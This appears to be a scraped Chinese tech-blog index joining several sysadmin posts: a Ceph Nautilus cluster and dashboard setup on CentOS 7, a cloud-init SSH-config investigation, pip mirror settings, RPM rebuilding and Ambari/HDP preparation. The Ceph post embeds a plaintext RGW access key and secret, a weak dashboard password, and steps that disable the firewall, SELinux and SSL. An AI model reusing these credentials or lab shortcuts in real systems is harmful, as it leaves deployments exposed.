firewalld systemctl stop firewalld echo \u0026#34;====dowload wget=========\u0026#34; yum install -y wget echo \u0026#34;====backup repo===========\u0026#34; mkdir /etc/yum.repos.d/bak mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/bak/ echo \u0026#34;====dowload aliyum-repo====\u0026#34; wget http://mirrors.aliyun.com/repo/Centos-7.repo -O /etc/yum.repos.d/Centos-Base.repo wget http://mirrors.aliyun.com/repo/epel-7.repo -O /etc/yum.repos.d/epel.repo echo \u0026#34;====upgrade yum============\u0026#34; yum clean all yum makecache fast echo \u0026#34;====dowload tools=========\u0026#34; yum install -y net-tools vim bash-completion echo \u0026#34;=========finish============\u0026#34; 每个节点安装和配置NTP（官方推荐的是集群的所有节点全部安装并配置 NTP，需要保证各节点的系统时间一致。没有自己部署ntp服务器，就在线同步NTP）\nyum install chrony -y systemctl start chronyd systemctl enable chronyd ceph-admin\nvim /etc/chrony.conf systemctl restart chronyd chronyc sources 这里使用阿里云的ntp服务器\nceph-node1、ceph-node2\nvim /etc/chrony.conf systemctl restart chronyd chronyc sources 这里指定ceph-admin节点的ip即可\n添加ceph源\nyum -y install epel-release rpm --import http://mirrors.163.com/ceph/keys/release.asc rpm -Uvh --replacepkgs http://mirrors.163.com/ceph/rpm-nautilus/el7/noarch/ceph-release-1-1.el7.noarch.rpm [Ceph] name=Ceph packages for $basearch baseurl=http://download.ceph.com/rpm-nautilus/el7/$basearch enabled=1 gpgcheck=1 type=rpm-md gpgkey=https://download.ceph.com/keys/release.asc [Ceph-noarch] name=Ceph noarch packages baseurl=http://download.ceph.com/rpm-nautilus/el7/noarch enabled=1 gpgcheck=1 type=rpm-md gpgkey=https://download.ceph.com/keys/release.asc [ceph-source] name=Ceph source packages baseurl=http://download.ceph.com/rpm-nautilus/el7/SRPMS enabled=1 gpgcheck=1 type=rpm-md gpgkey=https://download.ceph.com/keys/release.asc 磁盘准备 以下操作在osd节点（ceph-node1、ceph-node2）执行\n# 检查磁盘 [root@ceph-node1 ~]# fdisk -l /dev/sdb Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes # 格式化磁盘 [root@ceph-node1 ~]# parted -s /dev/sdb mklabel gpt mkpart primary xfs 0% 100% [root@ceph-node1 ~]# mkfs.xfs /dev/sdb -f meta-data=/dev/sdb isize=512 agcount=4, agsize=1310720 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0, sparse=0 data = bsize=4096 blocks=5242880, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal log bsize=4096 blocks=2560, version=2 = sectsz=512 sunit=0 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=0 查看磁盘格式 [root@ceph-node1 ~]# blkid -o value -s TYPE /dev/sdb xfs 安装ceph集群 配置ssh免密\n[root@ceph-admin ~]# ssh-keygen # 一路回车 [root@ceph-admin ~]# ssh-copy-id root@ceph-node1 [root@ceph-admin ~]# ssh-copy-id root@ceph-node2 安装ceph-deploy\n[root@ceph-admin ~]# yum install -y python2-pip [root@ceph-admin ~]# yum install -y ceph-deploy 创建文件夹用户存放集群文件\n[root@ceph-admin ~]# mkdir /root/my-ceph [root@ceph-admin ~]# cd /root/my-ceph/ 创建集群（后面填写monit节点的主机名，这里monit节点和管理节点是同一台机器，即ceph-admin）\n[root@ceph-admin my-ceph]# ceph-deploy new ceph-admin [ceph_deploy.conf][DEBUG ] found configuration file at: /root/.cephdeploy.conf [ceph_deploy.cli][INFO ] Invoked (2.0.1): /usr/bin/ceph-deploy new ceph-admin [ceph_deploy.cli][INFO ] ceph-deploy options: [ceph_deploy.cli][INFO ] username : None [ceph_deploy.cli][INFO ] func : \u0026lt;function new at 0x7f2217df3de8\u0026gt; [ceph_deploy.cli][INFO ] verbose : False [ceph_deploy.cli][INFO ] overwrite_conf : False [ceph_deploy.cli][INFO ] quiet : False [ceph_deploy.cli][INFO ] cd_conf : \u0026lt;ceph_deploy.conf.cephdeploy.Conf instance at 0x7f221756e4d0\u0026gt; [ceph_deploy.cli][INFO ] cluster : ceph [ceph_deploy.cli][INFO ] ssh_copykey : True [ceph_deploy.cli][INFO ] mon : [\u0026#39;ceph-admin\u0026#39;] [ceph_deploy.cli][INFO ] public_network : None [ceph_deploy.cli][INFO ] ceph_conf : None [ceph_deploy.cli][INFO ] cluster_network : None [ceph_deploy.cli][INFO ] default_release : False [ceph_deploy.cli][INFO ] fsid : None [ceph_deploy.new][DEBUG ] Creating new cluster named ceph [ceph_deploy.new][INFO ] making sure passwordless SSH succeeds [ceph-admin][DEBUG ] connected to host: ceph-admin [ceph-admin][DEBUG ] detect platform information from remote host [ceph-admin][DEBUG ] detect machine type [ceph-admin][DEBUG ] find the location of an executable [ceph-admin][INFO ] Running command: /usr/sbin/ip link show [ceph-admin][INFO ] Running command: /usr/sbin/ip addr show [ceph-admin][DEBUG ] IP addresses found: [u\u0026#39;192.168.150.101\u0026#39;] [ceph_deploy.new][DEBUG ] Resolving host ceph-admin [ceph_deploy.new][DEBUG ] Monitor ceph-admin at 192.168.150.101 [ceph_deploy.new][DEBUG ] Monitor initial members are [\u0026#39;ceph-admin\u0026#39;] [ceph_deploy.new][DEBUG ] Monitor addrs are [\u0026#39;192.168.150.101\u0026#39;] [ceph_deploy.new][DEBUG ] Creating a random mon key... [ceph_deploy.new][DEBUG ] Writing monitor keyring to ceph.mon.keyring... [ceph_deploy.new][DEBUG ] Writing initial config to ceph.conf... 修改集群配置文件\n注意：mon_host必须和public network 网络是同网段内\n[root@ceph-admin my-ceph]# vim ceph.conf # 添加如下两行内容 ...... public_network = 192.168.150.0/24 osd_pool_default_size = 2 开始安装\n[root@ceph-admin my-ceph]# ceph-deploy install --release nautilus ceph-admin ceph-node1 ceph-node2 # 出现以下提示说明安装成功 [ceph-node2][DEBUG ] Complete! [ceph-node2][INFO ] Running command: ceph --version [ceph-node2][DEBUG ] ceph version 12.2.13 (584a20eb0237c657dc0567da126be145106aa47e) nautilus (stable) 初始化monit监控节点，并收集所有密钥\n[root@ceph-admin my-ceph]# ceph-deploy mon create-initial [root@ceph-admin my-ceph]# ceph-deploy gatherkeys ceph-admin 检查OSD节点上所有可用的磁盘\n[root@ceph-admin my-ceph]# ceph-deploy disk list ceph-node1 ceph-node2 删除所有osd节点上的分区、准备osd及激活osd\n主机上有多块磁盘要作为osd时：ceph-deploy osd create ceph-node21 --data /dev/sdb --data /dev/sdc\n[root@ceph-admin my-ceph]# ceph-deploy osd create ceph-node1 --data /dev/sdb [root@ceph-admin my-ceph]# ceph-deploy osd create ceph-node2 --data /dev/sdb 在两个osd节点上通过命令已显示磁盘已成功mount\n[root@ceph-node1 ~]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 20G 0 disk ├─sda1 8:1 0 1G 0 part /boot └─sda2 8:2 0 19G 0 part ├─centos-root 253:0 0 17G 0 lvm / └─centos-swap 253:1 0 2G 0 lvm [SWAP] sdb 8:16 0 20G 0 disk └─ceph--2bb0ec8d--547c--42c2--9858--08ccfd043bd4-osd--block--33e8dba4--6dfc--4753--b9ba--0d0c54166f0c 253:2 0 20G 0 lvm sr0 查看osd\n[root@ceph-admin my-ceph]# ceph-deploy disk list ceph-node1 ceph-node2 ...... ...... [ceph-node1][INFO ] Disk /dev/mapper/ceph--2bb0ec8d--547c--42c2--9858--08ccfd043bd4-osd--block--33e8dba4--6dfc--4753--b9ba--0d0c54166f0c: 21.5 GB, 21470642176 bytes, 41934848 sectors ...... ...... [ceph-node2][INFO ] Disk /dev/mapper/ceph--f9a95e6c--fc7b--46b4--a835--dd997c0d6335-osd--block--db903124--4c01--40d7--8a58--b26e17c1db29: 21.5 GB, 21470642176 bytes, 41934848 sectors 同步集群文件，这样就可以在所有节点执行ceph命令了\n[root@ceph-admin my-ceph]# ceph-deploy admin ceph-admin ceph-node1 ceph-node2 在其他节点查看osd的目录树\n[root@ceph-node1 ~]# ceph osd tree ID CLASS WEIGHT TYPE NAME STATUS REWEIGHT PRI-AFF -1 0.03897 root default -3 0.01949 host ceph-node1 0 hdd 0.01949 osd.0 up 1.00000 1.00000 -5 0.01949 host ceph-node2 1 hdd 0.01949 osd.1 up 1.00000 1.00000 配置mgr\n[root@ceph-admin my-ceph]# ceph-deploy mgr create ceph-admin 查看集群状态和集群service状态\n此时是HEALTH_WARN状态，是由于启用了不安全模式\n[root@ceph-admin my-ceph]# ceph health HEALTH_WARN mon is allowing insecure global_id reclaim [root@ceph-admin my-ceph]# ceph -s cluster: id: fd816347-598c-4ed6-b356-591a618a0bdc health: HEALTH_WARN mon is allowing insecure global_id reclaim services: mon: 1 daemons, quorum ceph-admin (age 3h) mgr: mon_mgr(active, since 17s) osd: 2 osds: 2 up (since 3m), 2 in (since 3m) data: pools: 0 pools, 0 pgs objects: 0 objects, 0 B usage: 2.0 GiB used, 38 GiB / 40 GiB avail pgs: 禁用不安全模式\n[root@ceph-admin my-ceph]# ceph config set mon auth_allow_insecure_global_id_reclaim false [root@ceph-admin my-ceph]# ceph health HEALTH_OK 开启dashboard [root@ceph-admin my-ceph]# yum install -y ceph-mgr-dashboard [root@ceph-admin my-ceph]# ceph mgr module enable dashboard # 创建自签证书 [root@ceph-admin my-ceph]# ceph dashboard create-self-signed-cert # 创建密码文件 [root@ceph-admin my-ceph]# echo abc123 \u0026gt; ./dashboard_user_pw # 创建dashboard的登录用户 [root@ceph-admin my-ceph]# ceph dashboard ac-user-create admin -i ./dashboard_user_pw administrator {\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;lastUpdate\u0026#34;: 1646037503, \u0026#34;name\u0026#34;: null, \u0026#34;roles\u0026#34;: [\u0026#34;administrator\u0026#34;], \u0026#34;password\u0026#34;: \u0026#34;$2b$12$jGsvau8jFMb4pDwLU/t8KO1sKvmBMcNUYycbXusmgkvTQzlzrMyKi\u0026#34;, \u0026#34;email\u0026#34;: null} [root@ceph-admin my-ceph]# ceph mgr services { \u0026#34;dashboard\u0026#34;: \u0026#34;https://ceph-admin:8443/\u0026#34; } 测试访问\n上图中测试环境是win10+chrome，同事反应mac+chrome会出现无法访问的情况，原因是我们使用的自签证书，浏览器并不信任此证书，可以通过以下两种方式解决\n关闭dashboard的ssl访问\n下载证书配置浏览器信任证书\n关闭dashboard的ssl访问 [root@ceph-admin my-ceph]# ceph config set mgr mgr/dashboard/ssl false [root@ceph-admin my-ceph]# ceph mgr module disable dashboard [root@ceph-admin my-ceph]# ceph mgr module enable dashboard [root@ceph-admin my-ceph]# ceph mgr services { \u0026#34;dashboard\u0026#34;: \u0026#34;http://ceph-admin:8080/\u0026#34; } 如果出现Module 'dashboard' has failed: IOError(\u0026quot;Port 8443 not free on '::'\u0026quot;,)这种报错，需要重启下mgr：systemctl restart ceph-mgr@ceph-admin\n测试访问\n开启rgw管理功能 默认object gateway功能没有开启\n创建rgw实例\nceph-deploy rgw create ceph-admin 默认运行端口是7480\n创建rgw用户\n[root@ceph-admin my-ceph]# radosgw-admin user create --uid=rgw --display-name=rgw --system 提供dashboard证书\n[root@ceph-admin my-ceph]# echo UI2T50HNZUCVVYYZNDHP \u0026gt; rgw_user_access_key [root@ceph-admin my-ceph]# echo 11rg0WbXuh2Svexck3vJKs19u1UQINixDWIpN5Dq \u0026gt; rgw_user_secret_key [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-access-key -i rgw_user_access_key Option RGW_API_ACCESS_KEY updated [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-secret-key -i rgw_user_secret_key Option RGW_API_SECRET_KEY updated 禁用ssl\n[root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-ssl-verify False Option RGW_API_SSL_VERIFY updated 启用rgw\n[root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-host 192.168.150.101 Option RGW_API_HOST updated [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-port 7480 Option RGW_API_PORT updated [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-scheme http Option RGW_API_SCHEME updated [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-user-id rgw Option RGW_API_USER_ID updated [root@ceph-admin my-ceph]# systemctl restart ceph-radosgw.target 验证\n目前object gateway功能已成功开启\n其他 清除ceph集群 清除安装包\n[root@ceph-admin ~]# ceph-deploy purge ceph-admin ceph-node1 ceph-node2 清除配置信息\n[root@ceph-admin ~]# ceph-deploy purgedata ceph-admin ceph-node1 ceph-node2 [root@ceph-admin ~]# ceph-deploy forgetkeys 每个节点删除残留的配置文件\nrm -rf /var/lib/ceph/osd/* rm -rf /var/lib/ceph/mon/* rm -rf /var/lib/ceph/mds/* rm -rf /var/lib/ceph/bootstrap-mds/* rm -rf /var/lib/ceph/bootstrap-osd/* rm -rf /var/lib/ceph/bootstrap-mon/* rm -rf /var/lib/ceph/tmp/* rm -rf /etc/ceph/* rm -rf /var/run/ceph/* 清理磁盘设备(/dev/mapper/ceph*)\nls /dev/mapper/ceph-* | xargs -I% -- dmsetup remove % dashboard无法访问的问题 在关闭dashboard的https后，出现了一个很奇怪的问题，使用chrome浏览器无法访问dashboard了，edge或者使用chrome无痕模式可以正常访问，期间尝试了各种方法包括重新配置dashboard和清理chrome浏览器的缓存和cookie等方式都没有解决问题，结果第二天起来打开环境一看自己好了（淦）\n问题情况见下图\n日志报错：\n同步ceph配置文件 ceph-deploy --overwrite-conf config push ceph-node{1,2,3,4} 添加mon节点和mgr节点 ceph-deploy mon create ceph-node{1,2,3,4} ceph-deploy mgr create ceph-node{1,2,3,4} 记得修改配置文件\n之后同步配置文件\nceph-deploy --overwrite-conf config push ceph-node{1,2,3,4} 参考 https://www.cnblogs.com/kevingrace/p/9141432.html\nhttps://www.cnblogs.com/weijie0717/p/8378485.html\nhttps://www.cnblogs.com/weijie0717/p/8383938.html\nhttps://blog.csdn.net/qq_40017427/article/details/106235456\n","permalink":"https://lvbibir.github.io/posts/tech/centos7_deploy_ceph_dashboard_nautilus/","summary":"前言 ceph测试环境的搭建 基本环境 物理环境：Vmware Workstaion 系统版本：Centos-7.9-Minimal 两个osd节点添加一块虚拟磁盘，建议","title":"centos7部署ceph+dashboard（nautilus）"},{"content":"前言 在openEuler20.03 (LTS-SP1)系统上进行一些测试，发现某个东西会自动修改ssh配置文件导致系统无法通过密码登录，最后排查是由于安装了cloud-init导致的。\n以下是大致的排查思路\n出现这个问题前做的操作是安装了一些项目组同事指定的包，问题就应该出在这些包上\nyum install -y telnet rsync ntpdate zip unzip libaio dos2unix sos vim vim-enhanced net-tools man ftp lrzsz psmisc gzip network-scripts cloud-init cloud-utils-growpart tar libnsl authselect-compat 大致看了下，除了cloud-Init和cloud-utils-growpart这两个包其他包基本不可能去修改ssh的配置\n直接检索这两个包的所有文件中的配置，是否与PasswordAuthentication有关\n[root@localhost ~]# grep -nr PasswordAuthentication `rpm -ql cloud-utils-growpart` [root@localhost ~]# grep -nr PasswordAuthentication `rpm -ql cloud-init` 找到了修改这个参数代码的具体实现\n查看该文件\n[root@localhost ~]# vim +98 /usr/lib/python3.7/site-packages/cloudinit/config/cc_set_passwords.py 具体的判断操作和修改操作\n修改操作就不去深究了，主要看下判断操作，可以看到判断操作是使用了 util.is_true() ，该util模块也在该文件中引用了\n再去找这个util模块的具体实现\npython引用的模块路径如下，否则会抛出错误\n文件的同级路径下 sys.path 路径下 并没有在同级目录下\n[root@localhost ~]# ll /usr/lib/python3.7/site-packages/cloudinit/config/ | grep cloudinit sys.path 路径不知道可以用python终端输出下\n在/usr/lib/python3.7/site-packages路径下找到了cloudinit模块的util子模块\n查看util.is_true和util.is_false具体的函数实现\n逻辑很简单，判断 val 参数是否为bool值，否则对val参数的值进行处理后再查看是否在check_set中\n再回头看之前的/usr/lib/python3.7/site-packages/cloudinit/config/cc_set_passwords.py文件是怎样对util.is_true和util.is_false传参的\n可以看到是由handle_ssh_pwauth()函数传进来的\n再继续找哪个文件调用了这个函数\n还是这个文件，第230行\n这里参数pw_auth传的值是cfg.get(\u0026lsquo;ssh_pwauth\u0026rsquo;)\ncfg.get()这个函数get的东西是/etc/cloud/cloud.cfg配置文件下的ssh_pwauth的值\n到这里，就可以回头再看整个逻辑了\n调用handle_ssh_pwauth()函数，传了一个参数 pw_auth=0 调用util.is_true()和util.is_false函数，传了同一个参数 val=0 上述两个函数执行完后cfg_val的值最终为no 调用update_ssh_config({cfg_name: cfg_val})函数，cfg_name=PasswordAuthentication，cfg_val=no 即将sshd的配置文件的PasswordAuthentication值改为no ","permalink":"https://lvbibir.github.io/posts/tech/cloud-init_change_ssh_config/","summary":"前言 在openEuler20.03 (LTS-SP1)系统上进行一些测试，发现某个东西会自动修改ssh配置文件导致系统无法通过密码登录，最后排","title":"cloud-init自动将ssh配置文件的PasswordAuthentication参数值修改为no"},{"content":"中国科学技术大学 : https://pypi.mirrors.ustc.edu.cn/simple 清华：https://pypi.tuna.tsinghua.edu.cn/simple 豆瓣：http://pypi.douban.com/simple/ 华中理工大学 : http://pypi.hustunique.com/simple 山东理工大学 : http://pypi.sdutlinux.org/simple 阿里云：https://mirrors.aliyun.com/pypi/simple/\nlinux环境 mkdir ~/.pip cat \u0026gt; ~/.pip/pip.conf \u0026lt;\u0026lt; EOF [global] trusted-host=mirrors.aliyun.com index-url=https://mirrors.aliyun.com/pypi/simple/ EOF windows环境 使用dos命令set找到 userprofile 路径，在该路径下创建pip文件夹，在pip文件夹下创建pip.ini\npip.ini具体配置\n[global] timeout = 6000 index-url = https://pypi.tuna.tsinghua.edu.cn/simple trusted-host = pypi.tuna.tsinghua.edu.cn ","permalink":"https://lvbibir.github.io/posts/tech/python3_change_pip_repo/","summary":"中国科学技术大学 : https://pypi.mirrors.ustc.edu.cn/simple 清华：https://pypi.tuna.tsinghua.edu.cn/simple 豆瓣：http://pypi.do","title":"python3修改pip源"},{"content":"前言 要修改rpm包中的文件，对于自己编译的rpm包，只需要在源码中修改好然后重新编译即可。而对于并不是自己编译的rpm包，且不熟悉编译环境的情况下，可以使用rpm-build和rpm-rebuild工具反编译来修改rpm中的文件\n这里使用ceph-mgr软件包进行演示\n安装rpm-build\u0026amp;rpmrebuild rpmrebuild官网：http://rpmrebuild.sourceforge.net\nrpmrebuild下载地址：https://sourceforge.net/projects/rpmrebuild/files/rpmrebuild/2.15/rpmrebuild-2.15.tar.gz/download\n解压rpmrebuild\n[root@localhost ~]# mkdir -p /data/rpmbuild [root@localhost ~]# tar zxf rpmrebuild-2.15.tar.gz -C /data/rpmbuild/ [root@localhost ~]# ll /opt/rpmrebuild/ rpm-build直接使用yum安装即可\n[root@localhost ~]# yum install -y rpm-build 反编译\u0026amp;修改\u0026amp;重新编译 安装准备重新打包的rpm\n[root@localhost ~]# rpm -ivh ceph-mgr-12.2.13-0.el7.x86_64.rpm 查看rpm的安装名称\n[root@localhost ~]# rpm -qa |grep mgr ceph-mgr-12.2.13-0.el7.x86_64 配置rpm编译目录\nvim ~/.rpmmacros %_topdir /data/rpmbuild 创建目录\nmkdir /data/rpmbuild/BUILDROOT mkdir /data/rpmbuild/SPECS 执行脚本\n[root@localhost ~]# cd /data/rpmbuild/ [root@localhost rpmbuild]# ./rpmrebuild.sh -s SPECS/abc.spec ceph-mgr [root@localhost rpmbuild]# cd 解压原版RPM包\n[root@localhost ~]# rpm2cpio ceph-mgr-12.2.13-0.el7.x86_64.rpm |cpio -idv 这里软件包解压后是两个目录\n根据需求替换修改解压后的文件，这里我替换两个文件/root/usr/lib64/ceph/mgr/dashboard/static/Ceph_Logo_Standard_RGB_White_120411_fa.png和/root/usr/lib64/ceph/mgr/dashboard/static/logo-mini.png，并给原先的文件做一个备份\n[root@localhost static]# mv logo-mini.png logo-mini.png.bak [root@localhost static]# mv Ceph_Logo_Standard_RGB_White_120411_fa.png Ceph_Logo_Standard_RGB_White_120411_fa.png.bak [root@localhost static]# cp kubernetes-logo.svg logo-mini.png [root@localhost static]# cp kubernetes-logo.svg Ceph_Logo_Standard_RGB_White_120411_fa.png 修改abc.spec文件\n找到原文件所在的行，添加备份文件\n[root@localhost ~]# vim /data/rpmbuild/SPECS/abc.spec 这里创建的bbb目录是临时使用，编译过程肯定会报错，因为路径不对，根据报错修改路径\n[root@localhost ~]# mkdir -p /data/rpmbuild/BUILDROOT/bbb/ [root@localhost ~]# mv ./usr/ /data/rpmbuild/BUILDROOT/bbb/ [root@localhost ~]# mv ./var/ /data/rpmbuild/BUILDROOT/bbb/ [root@localhost ~]# rpmbuild -ba /data/rpmbuild/SPECS/abc.spec 这里可以看到他请求的路径\n修改目录名\n[root@localhost ~]# mv /data/rpmbuild/BUILDROOT/bbb/ /data/rpmbuild/BUILDROOT/ceph-mgr-12.2.13-0.el7.x86_64 再次编译\n[root@localhost ~]# rpmbuild -ba /data/rpmbuild/SPECS/abc.spec 生成的rpm位置在/data/rpmbuild/RPMS/\n查看原rpm包的文件\n[root@localhost ~]# cd /usr/lib64/ceph/mgr/dashboard/static [root@localhost static]# ll total 16 drwxr-xr-x 5 root root 117 Dec 6 03:11 AdminLTE-2.3.7 -rw-r--r-- 1 root root 4801 Jan 30 2020 Ceph_Logo_Standard_RGB_White_120411_fa.png -rw-r--r-- 1 root root 1150 Jan 30 2020 favicon.ico drwxr-xr-x 7 root root 94 Dec 6 03:11 libs -rw-r--r-- 1 root root 1811 Jan 30 2020 logo-mini.png 安装新rpm包，查看文件\n[root@localhost ~]# cd /data/rpmbuild/RPMS/x86_64 [root@localhost x86_64]# rpm -e --nodeps ceph-mgr [root@localhost x86_64]# rpm -ivh ceph-mgr-12.2.13-0.el7.x86_64.rpm [root@localhost x86_64]# cd /usr/lib64/ceph/mgr/dashboard/static [root@localhost static]# ll total 24 drwxr-xr-x 5 root root 117 Dec 6 03:53 AdminLTE-2.3.7 -rw-r--r-- 1 root root 1877 Dec 6 03:44 Ceph_Logo_Standard_RGB_White_120411_fa.png -rw-r--r-- 1 root root 4801 Dec 6 03:41 Ceph_Logo_Standard_RGB_White_120411_fa.png.bak -rw-r--r-- 1 root root 1150 Dec 6 03:41 favicon.ico drwxr-xr-x 7 root root 94 Dec 6 03:53 libs -rw-r--r-- 1 root root 1877 Dec 6 03:44 logo-mini.png -rw-r--r-- 1 root root 1811 Dec 6 03:41 logo-mini.png.bak 至此，rpm包中的文件修改以及重新打包的所有步骤都已完成\n参考 https://www.cnblogs.com/felixzh/p/10564895.html\n","permalink":"https://lvbibir.github.io/posts/tech/change_file_in_rpm_pkg/","summary":"前言 要修改rpm包中的文件，对于自己编译的rpm包，只需要在源码中修改好然后重新编译即可。而对于并不是自己编译的rpm包，且不熟悉编译环境的","title":"通过rpm反编译修改rpm包内的文件"},{"content":"前期准备 1. 安装包准备 Ambari2.7.5. HDP3.1.5. libtirpc-devel: 链接：https://pan.baidu.com/s/1eteZ2jGkSq4Pz5YFfHyJgQ 提取码：6hq3\n2.服务器配置 主机名 cpu 内存 硬盘 系统版本 ip地址 node001 4c 10g 50g isoft-serveros-4.2 192.168.150.106 node002 2c 4g 20g isoft-serveros-4.2 192.168.150.107 3.修改系统版本文件（所有节点执行） sed -i \u0026#39;s/4/7/g\u0026#39; /etc/redhat-release sed -i \u0026#39;s/4/7/g\u0026#39; /etc/os-release 4.配置主机名（所有节点执行） 2台服务器的hosts都需要做如下修改\n修改主机名 hostnamectl set-hostname node001 bash 修改hosts文件 vim /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 192.168.150.106 node001 192.168.150.107 node002 5.关闭防火墙及selinux（所有节点执行） 2台服务器上分别执行以下操作，关闭防火墙并配置开机不自动启动\nsystemctl stop firewalld systemctl disable firewalld setenforce 0 为了重启后依然关闭，配置如下文件\nvim /etc/sysconfig/selinux 修改 SELINUX=disabled 6.配置ssh互信（所有节点执行） 方法一\n在每台服务器上执行如下操作，一直回车即可\nssh-keygen -t rsa ssh-copy-id -i /root/.ssh/id_rsa.pub node001 ssh-copy-id -i /root/.ssh/id_rsa.pub node002 方法二\n在每台服务器上执行如下操作，一直回车即可\nssh-keygen -t rsa 在服务器1上将公钥（名为id_rsa.pub文件）追加到认证文件（名为authorized_keys文件）中:\ncat ~/.ssh/id_rsa.pub \u0026gt;\u0026gt; ~/.ssh/authorized_keys 去其他服务器节点将~/.ssh/id_rsa.pub中的内容拷贝到服务器1的~/.ssh/authorized_keys中,查看文件中的内容\ncat ~/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/eA09X4s5RIYvuYNxVvtOo6unY1mgipsFyoz/hy/Gwk0onfZvBi/Sl3TVRZO5aqcHccAGlLF7OPTKH1qUuKVtnUOQik0TouL5VKsOBDMHHRT9D5UwqaIE8tYDC8V6uwieFgscZcBjhrsJ/Iramo9ce7N9RTO3otRMRQxOs+Wd1F/ZOmpRtMGU2N4RH4i2quRU6m2lt/eJKpNupSHKoztTQRsEanilHVASnikAXH8JpG70iO7RXR/hLz+/Of3ISUrOMSO4/ZIIu4xnYN3jvsXOdK/qIhP/PI2s+uF22IvVE6xZYVadQFa4zAuhQmCBWkE7vMyI1UJkxP7OQYj72LUH root@node001 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCnz8wHoytR2Xlnl04rQq4I2vgUVWbkKjv30pj+Toz4719ah4cY9pvZj0JsfhVzaaCsR14BLFVLkqKUhCWK3K6muT4iHb+N0WirpbwfJkztmQeco7Ha9xrPQ8v/I4xZujFoMVA0tkb/32zRTxOkPv9AUgB8V6Lin6LnB/AcnhnmoIs5PdbAdh/kBGpQGKIZkbyCUOYz9/PZuGJoJBblqfWiqzxYYLN9+cYMkmPnB1HdDewAepIsIC18U3ujE+1Su2UlmISPvvr1zG4XR4ZZoKQsOOJq3XRMGVkDvmFhl03JHZpd6BW0796CeYVZ41UomWXTOduQql+tYWUbegzGLmRZ root@node002 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8AFoGJHp2M45xLYNzXUHLWzRwHsgRPHjeErStq0tEy9bQv4OkN41j0FrxVAYJiGHdHGturriVgUEtL59RjcrJH6bAvhP54nM5YiQlNnWnSUR27Zuaodz4nhYUFq/Co5eDN6lTfL8pgYiEdpBOvE5t1w3bisdblP7YGQ2lF1zzCEGfQ79QbntEbyGNoR9sGHm11x9fOH+fape8TjQJrEAO4d1tAhMqVygQKwqwAPKeqhEum6BaLli83TsXzd7gyz9H7AAc1m04NaLB26xfynW6MVuk1j94awXKlGXjrbNTC/Kg6M8bd5PT/k3DOkx4b+nEs8xZ5x1j4D2OaO1X6rZx root@node003 设置认证文件的权限：\nchmod 600 ~/.ssh/authorized_keys 将~/.ssh/authorized_keys同步到其他节点\nscp ~/.ssh/authorized_keys node002:~/.ssh/authorized_keys 注意：这里第一次使用同步还需要密码，之后就不需要了 验证免密是否配置成功\nssh到不同服务器\nssh node002 7. 配置ntp时钟同步 选择一台服务器作为NTP Server，这里选择node001\n将如下配置vim /etc/ntp.conf\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server 0.centos.pool.ntp.org iburst server 1.centos.pool.ntp.org iburst server 2.centos.pool.ntp.org iburst server 3.centos.pool.ntp.org iburst 修改为\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). #server 0.centos.pool.ntp.org iburst #server 1.centos.pool.ntp.org iburst #server 2.centos.pool.ntp.org iburst #server 3.centos.pool.ntp.org iburst server 127.127.1.0 fudge 127.127.1.0 stratum 10 node002节点做如下配置\nvim /etc/ntp.conf 将\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server 0.centos.pool.ntp.org iburst server 1.centos.pool.ntp.org iburst server 2.centos.pool.ntp.org iburst server 3.centos.pool.ntp.org iburst 修改为\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). #server 0.centos.pool.ntp.org iburst #server 1.centos.pool.ntp.org iburst #server 2.centos.pool.ntp.org iburst #server 3.centos.pool.ntp.org iburst server 192.168.150.106 在每台服务器上启动ntpd服务，并配置服务开机自启动\nsystemctl restart ntpd systemctl enable ntpd 9.设置swap（所有节点执行） echo vm.swappiness = 1 \u0026gt;\u0026gt; /etc/sysctl.conf sysctl vm.swappiness=1 sysctl -p 10. 关闭透明大页面（所有节点执行） 由于透明超大页面已知会导致意外的节点重新启动并导致RAC出现性能问题，因此Oracle强烈建议禁用\necho never \u0026gt; /sys/kernel/mm/transparent_hugepage/defrag echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled 11.安装http服务（node001节点执行） 安装apache的httpd服务主要用于搭建OS. Ambari和hdp的yum源。在集群服务器中选择一台服务器来安装httpd服务，命令如下：\nyum -y install httpd systemctl start httpd systemctl enable httpd.service 验证，在浏览器输入http://192.168.150.106看到如下截图则说明启动成功。\n13.安装Java（所有节点执行） 下载地址：https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html\ntar -zxvf jdk-8u271-linux-x64.tar.gz mkdir /usr/local/java mv jdk1.8.0_271/* /usr/local/java 配置环境变量\nvim /root/.bashrc 添加如下配置\nexport JAVA_HOME=/usr/local/java export PATH=$PATH:$JAVA_HOME/bin export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export JRE_HOME=$JAVA_HOME/jre 激活配置\nsource /root/.bashrc java -version 14. 安装maven3.6（node001节点执行） 下载解压\ntar -zxvf apache-maven-3.6.3-bin.tar.gz mkdir -p 